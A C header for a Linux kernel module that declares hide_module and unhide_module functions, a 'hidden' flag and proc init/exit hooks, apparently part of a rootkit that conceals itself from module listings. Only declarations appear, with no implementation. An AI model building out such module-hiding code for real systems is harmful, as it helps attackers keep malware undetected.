#ifndef _PROC_H
#define _PROC_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/uaccess.h> // copy from user

extern int hidden;

int hide_module(void);
int unhide_module(void);

int __init proc_init(void);
void proc_exit(void);
#endif
